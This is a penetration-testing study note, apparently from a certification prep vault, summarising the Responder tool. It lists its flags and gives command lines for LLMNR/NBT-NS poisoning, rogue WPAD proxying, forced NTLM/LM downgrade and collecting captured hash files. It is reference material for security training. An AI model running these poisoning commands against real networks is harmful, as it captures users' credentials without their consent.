---
tags: [cpts, tool, responder, llmnr, nbtns, mitm]
---

# 🧰 Responder

## 📦 Install
See [[Tool-Install]]. Must run as root.

## 🎯 Purpose
LLMNR/NBT-NS/MDNS poisoner and NTLM credential-capture tool (Linux-native; `.exe` build also exists).

## 🧱 Core syntax
```bash
sudo responder -I $INTERFACE
```

## 🚩 Useful flags
```text
-A              # analysis mode — observe without poisoning
-I $IF          # network interface ('ALL' for every interface)
-i $IP          # local IP (OSX only)
-e $IP          # poison replies pointing to a different IP
-b              # Basic HTTP auth instead of NTLM
-r              # answer NetBIOS wredir queries (can break things)
-d              # answer NetBIOS domain-suffix queries (can break things)
-f              # fingerprint requesting host
-w              # start WPAD rogue proxy
-u $HOST:$PORT  # upstream proxy for rogue WPAD
-F              # force NTLM/Basic auth on wpad.dat retrieval
-P              # force proxy auth
--lm            # force LM downgrade (legacy Windows)
-v              # verbose
```

## 🔧 Variants
```bash
responder -I $INTERFACE -A         # passive observe
sudo responder -I $INTERFACE       # active poisoning
sudo responder -I $INTERFACE -wf   # WPAD + fingerprinting
sudo responder -I $INTERFACE -v    # verbose
responder -I ALL                   # all interfaces
```

## 📂 Output
```text
/usr/share/responder/logs/
  (MODULE)-(HASHTYPE)-(CLIENT_IP).txt     e.g. SMB-NTLMv2-SSP-172.16.5.25.txt
```
Config (disable individual rogue servers, SQLite output): `/usr/share/responder/Responder.conf`.

#responder #llmnr #cpts
